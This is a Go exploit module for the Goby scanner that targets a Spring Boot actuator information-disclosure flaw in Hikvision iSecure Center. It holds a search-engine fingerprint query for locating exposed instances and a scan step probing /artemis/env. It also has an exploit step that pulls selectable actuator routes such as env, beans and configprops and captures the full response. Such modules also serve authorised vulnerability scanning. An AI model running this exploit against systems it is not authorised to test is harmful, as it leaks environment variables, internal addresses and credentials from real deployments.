package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hikvision iSecure Center springboot Information disclosure vulnerability",
    "Description": "<p>Hikvision iSecure Center is an integrated management platform, which can centrally manage the access video monitoring points to achieve unified deployment, configuration, management and scheduling. the framework it uses has a spring boot information disclosure vulnerability. An attacker can access the exposed route to obtain information such as environment variables, intranet addresses, and user names in the configuration.</p>",
    "Product": "HIKVISION-General-SMP",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2022-11-08",
    "Author": "sinkair",
    "FofaQuery": "title=\"综合安防管理平台\" && body=\"nginxService/v1/download/InstallRootCert.exe\"",
    "GobyQuery": "title=\"综合安防管理平台\" && body=\"nginxService/v1/download/InstallRootCert.exe\"",
    "Level": "2",
    "Impact": "<p>Hikvision iSecure Center is a spring boot information disclosure vulnerability. An attacker can access and download the heapdump heap to obtain sensitive information such as the intranet account password.</p>",
    "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:https://www.hikvision.com/cn</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "route",
            "type": "select",
            "value": "env,trace,beans,info,mappings,metrics,configprops",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/artemis/env",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "******",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "hikvision",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/artemis/{{{route}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "海康综合安防管理平台系统 springboot 信息泄露漏洞",
            "Product": "HIKVISION-综合安防管理平台",
            "Description": "<p>海康综合安防管理平台是一款集成管理平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统一管理和统一调度。其使用的框架存在spring boot信息泄露漏洞，攻击者可以通过访问暴露的路由获取环境变量、内网地址、配置中的用户名等信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞:<a href=\"https://www.hikvision.com/cn\">https://www.hikvision.com/cn</a><br></p><p>2、如非必要，禁止公网访问该系统<br></p>",
            "Impact": "<p>海康综合安防管理平台存在springboot信息泄露漏洞，攻击者可访问下载heapdump堆获取内网账号密码等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Hikvision iSecure Center springboot Information disclosure vulnerability",
            "Product": "HIKVISION-General-SMP",
            "Description": "<p>Hikvision iSecure Center is an integrated management platform, which can centrally manage the access video monitoring points to achieve unified deployment, configuration, management and scheduling. the framework it uses has a spring boot information disclosure vulnerability. An attacker can access the exposed route to obtain information such as environment variables, intranet addresses, and user names in the configuration.<br></p>",
            "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.hikvision.com/cn\">https://www.hikvision.com/cn</a></span><br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">2. If not necessary, prohibit public network access to the system.<br></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Hikvision iSecure Center is a spring boot information disclosure vulnerability. An attacker can access and download the heapdump heap to obtain sensitive information such as the intranet account password.</span><br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7379"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}